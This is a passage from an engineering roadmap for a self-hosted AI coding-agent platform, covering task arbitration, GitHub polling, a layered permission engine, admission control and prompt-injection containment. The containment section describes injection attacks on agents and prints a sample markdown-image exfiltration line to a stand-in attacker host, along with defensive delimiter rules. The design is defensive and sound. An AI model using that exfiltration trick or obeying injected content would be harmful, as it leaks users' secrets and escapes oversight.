that writes code unattended. It also gives 1.3/1.4 model-swap decisions an evidence base — moving a
logical model to a cheaper provider is otherwise a blind cost/quality trade.
**Decided (Research R6): Internal arena with deterministic grading.** The industry standard has shifted
away from public benchmarks to "internal arenas" of 20-40 real tasks. Crucially, outcomes (e.g. did it fix
the bug) must be evaluated deterministically via assertions/test suites to avoid the "circularity problem"
of LLM-as-judge. LLM judges are reserved strictly for evaluating transcript quality (tool usage, conciseness).
We will manage this via Promptfoo (Langfuse was recommended as an alternative by R6, but explicitly
rejected due to footprint in R1). Hardware-level reproducibility requires fixed seeds and `pass@k` stats.

#### 5.6 — Durable task records and supervisor arbitration
**Goal:** Any agent can propose work; a supervisor decides whether it becomes real.
**Depends on:** 5.3, 4.1, 1.9, 6.4.
**Done when:** tasks are first-class durable records with state, lineage (what proposed this, and
why), and the reason they exist; **any agent — orchestrator, block, sub-agent — may propose a task**;
the owning project supervisor arbitrates with four outcomes — accept and schedule, merge into an
existing task, defer, or **reject with a reason**; rejections are recorded so the same proposal is not
re-litigated every run; arbitration itself is a durable, auditable step.
**Decided: tasks are not memory.** They share the Postgres instance but live in their own schema,
keyed to Temporal workflow IDs. Every framework surveyed treats thread/task state and durable knowledge
as separate mechanisms even when co-located, and conflating them is a common design error.
**Decided: LLMs propose, deterministic code disposes.** Final scheduling authority stays in a non-LLM
control layer — a supervisor may reason about whether a task is worth doing, but concurrency, ordering,
and admission are enforced by code, tied to 6.4's limits. The reported production pattern is explicit
about this: a model might suggest running twenty things concurrently and the scheduler still approves
four. It also closes the trust-escalation gap where a sub-agent's output gets treated as more
authoritative merely because it originated inside the system.
**Decided:** Rejections are written to `memory_semantic` (5.1). Because the supervisor always reads
semantic memory as part of its system prompt, it inherently knows what was rejected and why before it
plans its next move, acting as a natural gating mechanism without requiring a dedicated blocklist.

---

## Tier 6 — Human-in-the-loop and autonomy

#### 5.7 — Task intake and triggers
**Goal:** Work starts without you typing, from the three sources that matter.
**Depends on:** 4.6, 5.3.
**Done when:** three trigger types can create tasks — **scheduled/recurring** (nightly dependency
checks, periodic repo health, standups), **GitHub events** (issue labeled, PR opened, review
requested, CI failed), and **supervisor-initiated** (5.3 notices drift, a stall, or an unmet goal and
opens work itself); every triggered task records what triggered it; triggers are per-project,
enable-able individually, and rate-limited so an event storm cannot flood the run queue; a trigger
that fires while a matching task is already running dedupes rather than stacking.
**Agent-initiated deferral is a block, not a scheduler API.** An agent that wants to come back later
("check this PR in 30 minutes") gets a **`wait_until` / `wake_after` block**, not the ability to create
cron entries. Two reasons: Temporal already has durable timers, so "resume in 30m" is
`workflow.sleep()` — a first-class part of the run rather than an external schedule pointing back at
it; and a cron-creating agent accumulates recurring jobs nobody is tracking, which is a slow leak of
exactly the kind 6.4 exists to prevent. Recurring schedules stay operator-configured; *deferral within
a run* is an agent capability.
**Agent-to-agent messaging routes through the supervisor as Temporal signals — not a socket.** Direct
IPC between live agent sessions puts coordination state outside durable execution, so it vanishes on
restart and is invisible to replay, auditing, and the run timeline. Temporal signals already provide
addressed, durable, replayable delivery. The supervisor mediates, which is also what makes
"anyone proposes, supervisor arbitrates" (5.7) enforceable rather than bypassable by agents talking
around it.
**Decided:** no general external webhook/API intake. The three above cover the real cases without
turning the platform into an open inbound endpoint.
**Decided:** supervisor-initiated intake is what makes "keep projects on track" active rather than
advisory — without it, 5.3 can only observe and complain.
**Decided: mirror ref-movement triggers automated dependency graph re-parsing.** An automated platform background trigger monitors 2.3 mirror updates; when a mirror ref moves on a default branch, it automatically enqueues a background activity to re-parse the repository manifests and update the Cross-Repo Dependency Graph (1.1c), keeping the topological order and staleness timestamps continuously synchronized.
**Decided — polling, and no inbound path anywhere.** Resolved for triggers and for 2.3's mirror
refresh together. Evidence:
- **304s are free.** GitHub does not count a conditional request against the primary rate limit when
  it returns `304 Not Modified` under an `Authorization` header — documented, and confirmed by live
  test. Steady-state polling of unchanged resources costs no quota.
- **The App token scales.** We already run a GitHub App for 2.6, and installation tokens get 5,000/hr
  plus 50/hr per repo beyond 20, to a 12,500/hr cap. Note polled-repo count tracks **repo bindings,
  not projects** — a project owns 1..N repos, so a handful of projects can mean dozens of polled
  repos. Budget against binding count
  equals project count — this covers dozens of projects at a 60s interval with room to spare.
- **Latency is irrelevant.** Triggered work runs for minutes. 60–120s to notice is invisible.
- **The alternatives don't do what they appear to.** Cloudflare Tunnel terminates TLS at Cloudflare's
  edge — plaintext URL, headers, and body — and the tunnel is bidirectional once up, so it relocates
  inbound to a third party rather than removing it. Cloudflare Workers **cannot** reach a tailnet at
  all: the Workers runtime's `connect()` is outbound TCP only and WireGuard needs UDP. Tailscale
  Funnel is by definition public exposure.

**Do not use the Events API**, despite it looking like the obvious source: 30s–6h latency and only 300
events retained per 30 days. Poll `GET /repos/{o}/{r}/issues?sort=updated` and
`/pulls?sort=updated` with ETag conditional requests (both return ETags and honour `If-None-Match` → 304 in live testing). Because GitHub has no repository-wide check-runs endpoint, `/commits/{ref}/check-runs` is not polled as a top-level intake trigger; instead, check-runs are polled strictly for the head SHAs of active pull requests discovered via `/pulls`, or evaluated on-demand by 4.8's PR checks block. Poll serially, not concurrently, per GitHub's secondary-limit
guidance; repeated polling while rate-limited risks an integration ban.
Two implementation details that will otherwise bite: **`/issues` also returns pull requests** (they
appear as issues carrying a `pull_request` key), so polling both `/issues` and `/pulls` double-reports
every PR unless deduped — possibly only one endpoint is needed. And **`GET /rate_limit` is exempt from
the primary limit but not the secondary one**, so a poller that checks its own budget on every cycle
can trip the limit it was trying to avoid.
**Open:** poll interval per signal type, and whether a project can opt into a tighter one. The only
scale at which this stops working is dozens-to-100+ actively polled repos at sub-minute granularity,
and the fix there is a longer interval or the App token's higher ceiling — not opening inbound. If it
ever genuinely breaks, the escape hatch that preserves the invariant is a webhook receiver *outside*
the cluster writing to a queue the cluster polls outbound — still no inbound path, but it adds a third
party holding the event stream, so treat it as a last resort rather than a planned evolution. If the
invariant ever must break, **Tailscale Funnel is the least-bad option, not Cloudflare Tunnel** — the
Funnel relay does not decrypt traffic, whereas Cloudflare terminates TLS and sees plaintext. And if
the Worker-queue variant is ever built, back it with Cloudflare Queues or D1, **not KV** — KV's free
tier allows only ~1k writes/day, which webhook volume blows through immediately.

**Considered and rejected: a Cloudflare Worker webhook receiver that the cluster subscribes to over an
outbound WebSocket** (the Slack Socket Mode shape — Worker takes the GitHub webhook, pushes it down a
socket the cluster opened). It genuinely preserves the no-inbound invariant, and it is the most
elegant variant of the escape hatch. Rejected anyway, for three reasons:
1. **The party count differs from Slack.** Slack is already the counterparty holding that data;
   Socket Mode only changes connection direction. A Worker *inserts a third party* between GitHub and
   us — Cloudflare would see issue bodies, PR titles, commit messages — where GitHub↔cluster is
   otherwise direct. Strictly worse than polling on the property this platform exists to protect.
2. **The poller is still required.** Webhook delivery is at-most-once in practice, so reconciliation
   polling is needed regardless to detect missed events. This is therefore a *second* event path, not
   a replacement — two systems to maintain for latency nothing consumes.
3. **Correct implementation is not small.** A plain Worker is request-scoped and cannot hold a
   persistent socket, so it needs a Durable Object (plus WebSocket Hibernation to avoid idle cost);
   two auth boundaries (GitHub→Worker HMAC, cluster→Worker credential); and buffering with
   acknowledgment and replay, because events pushed while the cluster's socket is down are otherwise
   lost — machinery Slack provides but Cloudflare would not.

Revisit only if polling quota becomes genuinely binding at hundreds of repos. Note that the 7.7 Slack
bot will already have built outbound-WebSocket client machinery (reconnect, acks, single-replica), so
the *build* cost would be lower then — but the trust argument in (1) is unaffected by that and remains
the deciding factor.

#### 6.1 — Unified pending-user queue *(UI layer)*
**Goal:** One inbox for everything waiting on you.
**Depends on:** 1.9, 1.6.
**Done when:** every blocked run — whether awaiting an answer to a question or a permission decision —
appears in one queue with full context (which project, task, block, what it wants, why); answering or
approving resumes the run durably via 1.9; the queue survives restarts; duplicate submissions on retry
are deduped by idempotency key.
**Decided: Diff Externalization via Temporal Queries.** Because pending HITL states are locked inside running Temporal workflows (via `interrupt(draft)`), the pending queue UI must query the Temporal Workflow for its exact payload (which contains the `git diff` and the Pre-Flight Policy evaluation) to render the approval card statelessly, rather than relying on a static Postgres record.
**Decided: split from the pause primitive, which is now 1.9.** *(Resolves a genuine dependency cycle
found by a quality gate: this entry declared `Depends on: 4.6`, while 4.6's Done-when requires
escalating to "the pending queue" — i.e. this entry. Four more entries — 1.4, 1.8, 4.8, 5.3 — required
it in prose without declaring it, which is why it had to move.)* What those entries actually need is
the ability to **pause durably and be resumed**, not a user interface. That primitive is Tier 1; the
inbox that renders it is here.

#### 6.2 — Permission policy engine, auto-mode, and denylist
**Goal:** Routine approvals stop interrupting you; dangerous ones can never be auto-approved.
**Depends on:** 6.1, 3.1.
**Done when:** a policy engine evaluates every permission-requiring action against deterministic rules
producing allow/deny/ask; auto-mode auto-approves rule-matched actions; a **strict denylist** is
unconditional and cannot be overridden by any automatic mode; every automatic decision is recorded with
the rule that fired.
**Correction: "deterministic rules" alone is too rigid, and a working implementation proves it.** Some
genuinely necessary policies cannot be expressed over tool names — *"never send sensitive data to
external endpoints,"* *"never irreversibly destroy files that existed before this session,"* *"never
download and execute code from an external source."* `summon-claude` resolves this with a **secondary
LLM classifier over prose rules**, and the design detail that makes it safe is the output shape:
**allow / block / *uncertain*, where uncertain escalates to the human queue** rather than guessing.
So the engine is a five-tier cascade, not two:
1. **Deterministic denylist** — absolute, evaluated first, never reachable by any later tier.
2. **Deterministic allowlist** — rule-matched auto-approve for the unambiguous majority.
3. **System 1 Classifier (Fast Triage)** — uses a fast decision model (e.g., Jev, or Laya via sidecar) to output a `Choice` probability. If confidence is high (e.g., `P(allow) > 0.95`), the decision is taken immediately. *(Research: `hack/research/feat-research-1727042000-jev-laya-decision-models.md`)*
4. **Generative LLM (System 2 Fallback)** — if the System 1 model is uncertain (confidence below threshold), it cascades to a stronger, generative LLM to reason about the edge case over prose rules. **May never override tier 1.** Every decision is audited.
5. **Escalate** — if the System 2 model is also uncertain, route to the queue (6.1), or AFK mode (6.3) if armed.
**The classifier needs its own circuit breaker.** `summon-claude` disables it after 3 consecutive or 20
total blocks, which is the right instinct: a misbehaving classifier that starts refusing everything
would otherwise deadlock the platform, and failing *open to escalation* is better than failing closed
to paralysis. Budget ~15s timeout; a timeout is *uncertain*, not *allow*.
**The classifier is itself injectable**, since it reads tool-call context that may contain hostile
text. That is precisely why tier 1 stays deterministic and first, and why the classifier's allow
decisions are audited rather than trusted silently.

**Mechanics proven in `dev-guard`, the operator's existing hook plugin — adopt rather than re-derive:**
- **Ordered matching, most specific first, first match wins** — allow, then ask, then block — with
  pipes and subshells evaluated *before* whole-command rules so a deny cannot be short-circuited by an
  earlier allow.
- **Block rules are never trustable; only ask rules are.** This is exactly tier 1's absoluteness
  expressed as a mechanism, and it is the constraint that makes a trust feature safe to offer at all.
- **Trust has a scope** — `session` or `always` — so a repeated approval becomes a recorded decision
  rather than a habit of clicking yes. That is what auto-mode should actually be built from.
- **Risk tiers computed from the object, not just the verb.** Their Kubernetes rules derive
  Critical/High/Medium/Low from the *resource type* (secrets and RBAC are critical; pods are low), and
  they parse manifest content for `privileged`, `hostNetwork`, `hostPath`, and `runAsRoot`. Permission
  decisions should read what is being acted on, not only what action is named.
- **Scrub credentials before writing the audit row.** Their store redacts token and password patterns
  at write time — an audit log that captures the secret it was recording access to is a new liability.
- **Validate the rule config, including empty patterns**, which silently match everything.
**Deliberate divergence:** `dev-guard` fails *open* because it is best-effort tooling on a developer's
machine. The platform's permission engine fails **to escalation**, not to allow — the classifier
circuit breaker above routes to the queue rather than waving work through.
**Decided:** the denylist is evaluated first and is absolute — AFK mode (6.3) cannot override it.
**Decided: capability scoping is evaluated *inside* this engine, never beside it.** GitHub's MCP server
shipped dynamic tool discovery that bypassed its own `--read-only` flag, letting a user obtain
PR-approval capability from a server configured read-only. Any mechanism that changes what an agent can
reach — per-role subsets (3.3), project-scoped tools (3.1), or a future discovery layer — resolves
through this engine, so a capability becoming *visible* never implies it is *permitted*.

#### 6.3 — AFK mode and the virtual developer
**Goal:** You can walk away and work continues, defensibly.
**Depends on:** 6.2, 4.4.
**Done when:** AFK mode is armed **per project** (with per-task override), not globally; when armed, a
virtual-developer block — a grounded, UX-literate persona — can do light research and then answer
interactive questions as a reasonable developer would, and approve permission prompts beyond auto-mode's
deterministic reach, **or deny with a concrete suggested alternative**; decisions are binding and execute
immediately; every decision records the prompt, the reasoning, the research performed, and the outcome,
and is reviewable and replayable afterwards; the strict denylist still applies absolutely.
**Decided:** Local runner host execution (4.9c) is **structurally prohibited** from AFK auto-approval. Like definition proposals (4.13), host-level execution always requires physical, out-of-band human confirmation.
**Decided:** binding, not advisory — an advisory mode leaves the run blocked and does not solve being
away from the keyboard. Per-project arming means a risky project stays manual while routine ones run
unattended.

#### 6.4 — Admission control: spend, concurrency, and resources
**Goal:** No autonomous loop can run the platform into a wall unattended — financially or physically.
**Depends on:** 1.4, 4.6, 6.1, 1.8.
**Resource admission (storage and memory) is part of this, and nothing currently owns it.** A task whose workspace PVC cannot
be satisfied does not fail — it sits `Pending`, and so does the pod, and the task stalls **silently**. Similarly, on a 64GB SNO node with only ~30GB free at idle and zero swap, concurrent task pods, Kata microVMs (2GB static reservation each), Playwright browser pools (500MB–1GB each), and toolchain compilations will induce memory exhaustion, triggering kernel OOM kills against single-replica platform infrastructure (Postgres, Temporal). Four pieces:
- **Storage pre-admission check.** The data already exists: the topolvm driver sets `storageCapacity: true` and
  publishes `CSIStorageCapacity` (measured: `lvms-vg1`, ~3.67 TiB available). Query it, subtract
  outstanding warm-pool and retained-workspace reservations, and **queue the task rather than creating
  a doomed PVC** when headroom is insufficient.
- **Node RAM and memory pressure pre-admission check.** Query real-time allocatable node RAM from VictoriaMetrics (`node_memory_MemAvailable_bytes`), reserve an immutable 6GB safety headroom for core singletons (Postgres, Temporal, MinIO, LiteLLM), and compute prospective memory requests (active + queued workspace requests/limits). When allocatable RAM minus outstanding commitments falls below the 6GB reserve, **queue the task instead of admitting it to thrash or trigger kernel OOM kills**.
- **A Pending watchdog.** A PVC or pod Pending beyond a short threshold raises a platform health event
  (1.8). Kubernetes' capacity-aware scheduling prevents a *wrong* placement; it does not prevent an
  indefinite wait, and an indefinite wait is indistinguishable from a slow task without this.
- **Reaping is a capacity control, not just hygiene.** 4.10's retention policy directly sets headroom,
  so the two entries are coupled: loosening retention without raising the admission reserve is how the
  disk fills.
- **The Infinite Rebase Circuit Breaker.** To prevent an agent from burning tokens in an endless `Rebase -> Conflict -> LLM Resolve -> Wait -> Rebase` loop on a highly active `main` branch, a `max_rebase_attempts` ceiling (e.g., 3) is enforced. Hitting the cap triggers a hard abort, requiring manual intervention.
- **Concurrency on a shared repo binding is admitted, not assumed.** 4.5's file claiming serialises
  blocks *within* one task's tree; nothing stops two separate **tasks** cloning the same repo binding
  and both branching and publishing. That is a merge-conflict generator and, worse, two agents solving
  the same problem twice. Admission checks binding-level concurrency: queue the second task, or admit
  it only if it declares a disjoint path set. The limit is per binding, not per project, because the
  repo is the contended resource.
- **Timezone is declared, not inherited.** Schedules (5.6), monthly budget windows (1.4), and retention
  horizons (4.10) all depend on when a day or month ends. Pick one — UTC internally, with the operator's
  zone for display — and state it, because "nightly" silently meaning 01:00 local after a DST shift is a
  classic and irritating failure.
**Done when:** platform-wide and per-project caps exist on concurrent runs, total spend per window,
task-spawn depth, workspace storage, **and node RAM headroom (with a hard safety reserve for platform singletons)**; a supervisor cannot recursively spawn work past a bounded depth; breaching a cap
pauses new work and raises a queue item rather than failing silently or continuing; caps are visible
and adjustable in the dashboard.
**Decided:** 1.4 bounds spend *per logical model* and 4.6/4.8 bound retries *per run*. Neither bounds
the aggregate. A global supervisor that spawns project work, which spawns tasks, which spawn blocks,
which retry, has no ceiling — and AFK mode (6.3) removes the human who would otherwise notice. The
$300/month corporate cap in 1.4 could be consumed in an hour by a loop that never violates any
single-model budget.
**Decided (Memory admission on SNO):** On a multi-node cluster, memory pressure triggers pod eviction to sibling nodes. On SNO with zero swap, memory pressure triggers kernel OOM kills against critical single-replica platform pods (Postgres or Temporal), corrupting workflow state and bringing down the control plane. Memory admission is therefore a hard gate alongside storage: admission queries real-time node memory available via VictoriaMetrics (`node_memory_MemAvailable_bytes`), enforces pod memory requests on all sandboxes, browsers, and tool containers, and queues tasks when allocatable memory minus prospective requests drops below 6GB.

#### 6.5 — Prompt-injection containment
**Goal:** Repo and web content are treated as untrusted input, not as instructions.
**Depends on:** 6.2, 5.1, 3.1.
**Done when:** content pulled into a block's context from the workspace, fetched pages, issue and PR
bodies, or tool output is delimited and marked untrusted; the permission engine (6.2) treats
tool calls originating from a turn that ingested untrusted content as requiring elevated approval;
memory loading follows 5.1's global-versus-project precedence rule, and the untrusted tier (2.7) is
loaded without project memory at all; the strict denylist applies regardless of how
convincingly a turn argues for an exception; injection attempts are logged as security events.
**Decided:** this was ranked the #2 threat with named CVEs across every major agent product — Cursor
CVE-2025-54135 (CVSS 9.8), Copilot CVE-2025-53773 (9.6), Claude Code CVE-2026-21852 — and had no
implementing entry. Isolation runtime does nothing for it; egress allowlisting is the backstop, not the
control. This is where the actual control lives.

**Concrete mechanics, adopted from a working implementation in `summon-claude` (source reviewed, not
summarised).** "Delimited and marked untrusted" was hand-waving; these are the specifics:
- **Nonce-based spotlighting.** The delimiter carries a per-process random suffix
  (`secrets.token_hex(8)`), so the tags are `<<UNTRUSTED_EXTERNAL_DATA_{nonce}>>` / matching close.
  An attacker cannot craft content that closes the block, because the nonce is unguessable and
  regenerated every process start. A fixed delimiter string is forgeable and therefore nearly useless.
- **An in-band preamble**, inside the delimiter, restating that the content is data to analyse and not
  instructions to follow — belt and braces alongside the structural marker.
- **Strip the delimiters from agent *output*.** A second-order defense worth its own line: if the agent
  ever echoes the delimiter, the nonce leaks and every future injection can forge it. Match on this
  process's actual nonce, not on arbitrary hex.

**Output-side exfiltration filtering — a dimension this entry was missing entirely.** Containing input
does nothing about the *egress* path, which is how stolen data actually leaves. Every agent-authored
output rendered anywhere (dashboard, Slack, a PR comment) is filtered:
- **Strip markdown images and HTML `<img>` tags.** `![](https://attacker/?d=<secret>)` exfiltrates the
  moment a client renders it. This is the primary vector, not an exotic one.
- **Defang URLs carrying credential-shaped query parameters** (`key`, `token`, `secret`, `password`,
  `api_key`, `auth`, `credential`) — rewrite the scheme so nothing auto-fetches them.
- Every removal is reported as a warning attached to the run, not silently dropped, so a filtered
  output is visibly filtered rather than mysteriously different.

**Wrap at the tool-result boundary, once, for everything.** Untrusted marking is applied by the
platform where a tool returns — covering MCP results, fetched pages, repo content, and Slack or Jira
payloads uniformly — rather than each integration remembering to do it. An integration that forgets is
the hole.
**Open:** whether elevated approval on untrusted-ingest turns is tolerable in practice or produces so
much queue noise that it gets disabled — which would be worse than not building it. Measure before
making it the default.

---

## Tier 7 — Surfaces

Each entry below is independently shippable once its data source exists.

#### 7.1 — Native run and task timeline (Live Execution Canvas)
**Depends on:** 4.6, 1.5. Temporal run state, current node, event history, retries, failures, and
pending approvals rendered as our own task/block timeline — not an embedded Temporal Web UI.
**Decided (Research: `hack/research/ui-research-1790098582-semaphore-temporal-workflows.md`):** The timeline merges with the Authoring Canvas (see 7.4) into a **Unified Live Execution Overlay**. Temporal Event History (e.g. `ActivityTaskStarted`) and LangGraph checkpoints stream via WebSockets to update graph node states (e.g. Running, Success, Failed, Approval waiting) in real-time on the same graph UI used for building workflows.
Scalable listing via Search Attributes; all agent-generated content, artifacts, logs, and timeline events are
strictly sanitized against Stored XSS (via DOMPurify and safe markdown rendering) under a strict Content
Security Policy (CSP) before rendering in the browser.

#### 7.2 — Trace and evaluation views
**Depends on:** 1.5b, 4.4. OpenTelemetry traces rendered from PostgreSQL spans collected via 1.5b, alongside prompts, completions, and scores inline on a run rather than in a separate tab.

#### 7.3 — Git, PR, and CI status views
**Depends on:** 4.7, 4.8. Branch, working tree, commits, PR, and CI check state shown inline on the task
that produced them, so a code-writing run shows its own PR and failing checks. Per Invariant I10 and
Entry 4.7, multi-repo tasks render the complete coordinated PR saga: showing dependency ordering across
all affected repositories, CI status per PR, and the normal intermediate state where some PRs are merged
while dependent downstream PRs await review or merge. The data comes from the publish and checks blocks'
own artifacts, not from a separate GitHub poller.

#### 7.4 — Authoring UI: integrations, agents, blocks, workflows
**Depends on:** 4.6, 3.1, 4.3b, 1.6, 3.4.
**The flow, end to end** — each step narrowing what the next can see, which is the scope model made
visible rather than a second set of rules:
1. **Add an integration or configure platform-mediated tool** → auto-discovery (3.1) and broker registration (3.4) populate in-sandbox tools and platform-mediated tools (`web_search`, `web_fetch`, `browser_automate`, MCPs) → they appear in the catalogue marked *inert*, reachable by nothing yet.
2. **Bind to projects** → tools and platform-mediated capabilities become *eligible* in those projects only, with credentials brokered per 3.2.
3. **Author an Agent** (4.3b) → persona, logical model, and a **default tool scope** (both sandbox tools and platform-mediated tools) chosen from what is eligible.
4. **Author a block** → pick its Agent → the tool picker shows sandbox and platform-mediated tools eligible *in this project*, grouped by integration and broker service, pre-filled with the Agent's defaults → narrow further if wanted → declare typed inputs/outputs, workspace mode, and the paths it will touch (4.5's claim declaration).
5. **Compose workflows** from blocks, nesting as needed. **Decided (Research: `hack/research/ui-research-1790098582-semaphore-temporal-workflows.md`): We will *stay* with React Flow (xyflow)** rather than adopting Semaphore's Drawflow. React Flow's 0-month maintenance gap (vs Drawflow's 23-month dormancy) and robust handling of DAGs and cyclic graphs (required for LangGraph loops) make it mandatory for enterprise use.
   - **Unified Node Taxonomy:** Adopt Semaphore's design pattern: map Temporal Activities to `Task` nodes, Temporal Signals/Wait-Conditions to `Approval` nodes (with in-node "Approve"/"Reject" buttons), and annotations to `Note` nodes.
   - **Per-Node Parameter Overrides:** Allow users to override arguments (e.g. `activity_args`) per node directly within the React Flow graph instead of touching the underlying block definition.
   - **Unified Canvas:** The React Flow canvas used here for composition serves double-duty as the Live Execution Canvas in 7.1.
   Validate before save; version every definition; export/import YAML per 1.1.

**Two UX properties that decide whether scoping is real or decorative:**
- **Show what is unavailable and why**, rather than omitting it. "Not bound to this project" and "does
  not exist" must be distinguishable, or the operator cannot tell a missing integration from a missing
  binding, and will go looking in the wrong place.
- **Never default to selecting everything available.** Default to the Agent's declared scope, or to
  nothing. A picker that pre-selects all eligible tools turns least-privilege into a checkbox nobody
  unticks.
- Quarantined tools (3.1) appear as quarantined, **with a diff of what changed**, not silently absent.

**Resolves an overlap between 3.3 and 4.3b.** The two subsets operate at different layers and are not
duplicates: an **orchestrator Agent's** subset is over **blocks and workflows** — what it may
*schedule* — while a **block's** tool scope is over **tools** — what the LLM inside may *call* during
its turn. An Agent carries a default tool scope that blocks using it inherit and may narrow. 3.3's
wording ("blocks, workflows, and tools") conflated these; the layering is scheduling versus calling,
matching the block/tool distinction in Part 2.

#### 7.5 — Platform CLI
**Depends on:** 1.1, 4.6. Day-to-day operations from a terminal: start tasks, tail runs, answer queue
items, export/import definitions, trigger upgrades.

#### 7.6 — ACP server for editors
**Depends on:** 5.4, 2.2. WebSocket JSON-RPC implementing the Agent Client Protocol so Zed, T3 Code, and
similar editors drive the platform as their agent backend. The archived
`feat-acp-adapter-1789827137-server.md` has reviewed design content worth mining — specifically the
single-replica in-memory state and unbounded-queue conclusions.

#### 7.7 — Slack conversational bot
**Depends on:** 6.1, 5.4. A first-class client: start tasks, converse with the global supervisor, check
status, and answer/approve queue items inline. Per-channel project binding; threading; run and diff
rendering.
**Decided:** full conversational bot, not notification-only.
**Decided: Socket Mode, not the HTTP Events API.** Socket Mode uses an outbound-initiated WebSocket and
needs no public Request URL, which preserves the no-inbound invariant. Documented limits are 10
concurrent WebSocket connections (ample for one bot) and no listing in the public Slack Marketplace —
irrelevant for an internal app. No other material feature gap versus the HTTP model, though acks are
envelope-based rather than HTTP responses.
**Consequence: the Slack bot runs single-replica.** Slack distributes payloads *unpredictably* across
multiple open Socket Mode connections, so a second replica does not load-balance — it silently splits
the event stream and each replica sees an arbitrary subset. Same conclusion the archived ACP plan
reached for the same class of reason. Had Socket Mode
not existed, the Slack requirement alone would have forced an inbound path and the invariant would
have had to be renegotiated.

---

## Tier 8 — Install, onboarding, upgrade

#### 8.1 — Infrastructure onboarding
**Goal:** A new install is a guided path, not tribal knowledge.
**Depends on:** 0.4, 1.1.
**Done when:** a CLI wizard validates prerequisites, scaffolds the GitOps config repo, provisions the
private remote, streams secrets into the cluster **in memory only** (piped to `kubectl apply -f -`,
never written to disk or passed as argv), and runs the first Helm install; non-interactive flags support
automation.
**Decided: the private repo is per-deployment, not a product artifact.** There is no private *platform*
repo — the platform's code is public with unmetered CI. What is private is **each operator's own GitOps
config repo**, holding their cluster values, admin allowlist, model routing with provider endpoints,
and budget figures. Every user deploying the platform creates one; none of them is shared.
**The UX is a guided flow; `gh` is an implementation detail the operator never types.** The wizard asks
what it needs (org, repo name, admin email), detects an existing config repo and offers to adopt it
rather than blindly creating a second, creates the repo, reports the URL, and continues — with clear
failure messages when a name collides or a token lacks scope. Shelling out to `gh` under the hood is
fine; making the operator assemble `gh repo create --template ... --private` by hand is not. The same
flow should later be reachable from the dashboard, not only first-run.
**Decided: seed it from a public template repository, created private.** A public
`platform-config-template` in the org, instantiated with `gh repo create <org>/<name> --template
... --private`. This beats the archived design of scaffolding a directory locally and then pushing it:
the scaffold becomes publicly versioned and reviewable, instantiation is one command, and the user's
values never pass through a local staging step. **Known limitation to design around:** GitHub template
repos do not propagate updates to instantiated copies, so config-schema changes must reach existing
installs some other way — that is 8.4's job (the platform opens a PR against the user's config repo),
and it should be built knowing the template cannot do it.
**Decided:** the archived `onboarding-cli-1789851761.md` went through review, fix, and quality-gate
cycles and its secure-secret-piping and preflight-validation content should be mined directly rather
than re-derived.

#### 8.2 — User onboarding
**Goal:** A fresh install walks you to your first successful task.
**Depends on:** 8.1, 4.6, 1.6, 1.1b.
**Done when:** an in-app wizard configures models and budgets, connects integrations, creates a first
project with its repo, and runs a first task end to end; progress is resumable; it is skippable.

#### 8.3 — Upgrade: preflight, migration, and backup gate
**Goal:** Upgrading is safe and honest about what it cannot undo.
**Depends on:** 1.1.
**Done when:** `helm upgrade` triggers startup migrations behind the advisory lock; a fresh `pg_dump` is
**required** and the upgrade refuses without one; preflight checks version skew and reports the migration
plan; destructive migrations are labelled breaking; release notes state plainly that rollback means
restore-from-backup.
**Decided: a release that changes a seeded definition does not overwrite an edited one.** 4.9 ships
personas, blocks, and workflows as "seeds the operator edits" — so on release two, an improved
`code-reviewer` meets one the operator has customised. Seeds carry their origin version; an upgrade
updates untouched seeds in place, and for edited ones raises a **reviewable diff in the queue** rather
than clobbering or silently skipping. Same propose-then-approve shape as 4.13 and 5.2, for the same
reason: the platform may suggest, it may not overwrite the operator's work.
**Decided:** manual `helm upgrade` is the trigger for the first cut. No auto-upgrade. **Immich is the
reference model** — the closest real analog (solo operator, Postgres-backed, continuously shipped): it
runs forward-only startup migrations, enforces required intermediate version stops, and states outright
in its docs that downgrade is never supported. Copy that posture. GitLab's 16.0→16.2 incident is the
cautionary case: a later release added a `NOT NULL` constraint assuming an earlier migration had run,
and hard-failed production where it hadn't.

#### 8.4 — Upgrade automation and in-app update awareness
**Goal:** You find out an upgrade exists without going to look.
**Depends on:** 8.3, 1.6.
**Done when:** Renovate-style PRs bump the chart version pin in the user's GitOps repo; the dashboard
shows an update-available indicator with the changelog and migration plan; merging the PR applies it.

#### 8.5 — Day-2 resilience and failure testing
**Goal:** The platform is exercised under failure before failure exercises it.
**Depends on:** 8.3, 1.7, 1.8.
**Done when:** a repeatable suite covers — **load** (concurrent task runs to the admission limits in
6.4, confirming it queues rather than thrashes); **chaos** (kill the Temporal worker mid-run, evict a
workspace pod, fill the LVM volume group, revoke a credential mid-task, take the git mirror offline —
each should degrade visibly, not silently); **restore** (the 1.7 drill, run as part of this suite rather
than only on its own schedule); and **security** (egress escapes from a sandbox, an attempted
credential read from an LLM block, a scope violation, a forged untrusted-content delimiter).
**Decided:** this is the entry that tests the *platform*, distinct from 5.5 which evaluates *agent
quality*. Nothing else in the roadmap exercises failure paths, and a single-node deployment with no HA
has more failure paths than most.
**Decided:** The resilience suite runs directly against the SNO cluster during initial development.
While `kind` is cheaper, it cannot reproduce the actual TopoLVM storage constraints, network policies,
or sandbox isolation tiers where the actual production failures will occur.

#### 8.5b — License compliance and supply chain security
**Goal:** The platform knows and complies with the licenses of everything it ships.
**Depends on:** 0.2. *(Decoupled from 8.5 chaos testing; integrated directly into the 0.2 CI build pipeline).*
**Done when:** a dependency scanning tool runs in CI; the build generates an accurate Software Bill of Materials (SBOM); the platform enforces a license allowlist (e.g., rejecting AGPL or non-commercial licenses for dependencies); the user-facing dashboard surfaces license attributions.

#### 8.6 — Multi-user and team self-hosting *(stretch)*
**Goal:** The stated stretch goal, built only once the single-operator platform is solid.
**Depends on:** 1.2, 6.2. Per-user credentials, project membership and roles enforced end to end,
per-user cost attribution, concurrent-operator safety, and the multi-replica migration discipline
(expand/contract) that single-replica startup migration deliberately skips.

---

## How to execute this roadmap

**Plan per entry, not per tier.** Each numbered entry is sized to feed
`/code-quality:incremental-planning` directly. A tier-level plan would be unreviewable and would
discard the property every entry was written for — that it ships standalone.

**Plan just-in-time: one or two entries ahead, never the whole roadmap.** This is the most important
rule here, and it is evidenced rather than asserted. Drafting this document reversed three major
decisions on new information (project→repo cardinality, memory storage, tool virtualization), and
measuring the live cluster invalidated several assumptions outright — RWX was not merely inadvisable
but unavailable; `agent-sandbox-operator` turned out to ship in the Red Hat catalog; etcd encryption was off.
Planning all sixty-six entries now would bake in exactly the assumptions the first three implementations
will overturn.

**Follow the dependency graph, not the tier numbering — and treat this as a hard warning, not a
